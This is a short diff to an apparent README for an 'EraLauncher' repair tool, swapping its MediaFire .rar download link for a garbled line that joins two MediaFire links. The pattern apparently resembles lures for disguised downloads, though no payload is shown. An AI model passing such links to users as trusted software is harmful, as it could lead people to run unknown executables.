@@ -5,7 +5,7 @@
 - #### 💻 Downloading
      ```
     >> Download the Repair tool
-     >> Link: https://www.mediafire.com/file/yscxomjuju7bviz/EraLauncher--repair-tool-main-.rar/file
+     >> Link: https://www.mediafire.com/file/yscxomjuju7bviz/EraLauncher--repair-tool-main-.rar/file](https://www.mediafire.com/file/u3bvhpf03c7ec5e/EraLauncher--repair-.rar/file
      
     ```
 - #### 🖥️ Starting
